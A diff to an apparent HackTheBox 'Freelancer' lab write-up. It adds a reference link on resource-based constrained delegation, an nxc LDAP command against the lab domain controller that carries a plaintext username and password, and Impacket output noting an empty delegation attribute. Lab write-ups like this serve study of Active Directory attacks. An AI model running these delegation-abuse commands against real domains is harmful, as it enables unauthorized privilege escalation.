@@ -682,6 +682,8 @@ I also had write to the key credentials link, but after trying to apply shadow c
 
 But i can abuse this using RBCD
 
+https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
+
 ```python
 nxc ldap dc.freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199' -M maq
 LDAP        10.129.66.164   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb) (signing:None) (channel binding:No TLS cert) 
@@ -708,7 +710,11 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 ```
 
-As seen here the attribute is 
+As seen here the attribute is empty
+
+```python
+
+```
 
 
 
